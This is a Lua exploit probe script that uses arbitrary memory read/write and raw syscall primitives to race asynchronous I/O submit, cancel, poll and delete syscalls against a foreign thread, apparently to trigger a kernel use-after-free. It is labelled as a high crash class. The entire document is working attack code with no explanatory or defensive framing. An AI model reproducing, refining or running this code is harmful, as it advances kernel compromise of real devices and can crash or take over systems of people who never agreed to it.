-- CRASH_CLASS: HIGH
-- PROBE 900a r3: creator, synchronised. Publishes ids + a ready flag, then per round
-- submits a pair, lets a foreign thread hammer the same ids, cancels+polls+deletes.
-- The foreign lookup happens while the object is in flight; the delete happens after.
print("=== PROBE 900a r3: synchronised owner ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,uint64(v)) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
print("[0] pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
local sv=memory.alloc(8); zero(sv,8)
pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd=rd(sv)
local N=2
local reqs=memory.alloc(0x28*N); zero(reqs,0x28*N)
local buf=memory.alloc(0x1000); zero(buf,0x1000)
local b=to_num(buf)
for i=0,N-1 do local r=reqs+i*0x28
  wd(r+0x08,0x1000); wd(r+0x10,b%4294967296); wd(r+0x14,math.floor(b/4294967296)); wd(r+0x20,fd) end
local ids=memory.alloc(32); zero(ids,32)
local flg=memory.alloc(16); zero(flg,16)
local st=memory.alloc(32); local er=memory.alloc(32)
print(string.format("IDBUF=0x%X",to_num(ids)))
print(string.format("FLAG=0x%X",to_num(flg)))
sleep_ms(900)
for round=1,6 do
  zero(ids,32); zero(st,32); zero(er,32)
  local o,r=pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids)) end)
  if not o then print("[R"..round.."] submit FAIL") break end
  wd(flg,0xCAFE)
  print(string.format("[R%d] ids=%X,%X",round,rd(ids) or 0,rd(ids+4) or 0))
  sleep_ms(350)
  zero(st,32)
  pcall(function() mk(666)(uint64(ids),uint64(1),uint64(st)) end)
  zero(st,32)
  pcall(function() mk(664)(uint64(ids),uint64(N),uint64(st)) end)
  zero(er,32)
  local o2,r2=pcall(function() return mk(662)(uint64(ids),uint64(N),uint64(er)) end)
  print(string.format("[R%d] st=%s,%s delete ret=%s errs=%X,%X",round,tostring(rd(st)),tostring(rd(st+4)),
     tostring(o2 and to_num(r2) or "FAIL"),rd(er) or 0,rd(er+4) or 0))
  sleep_ms(120)
end
print("[Z] alive pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
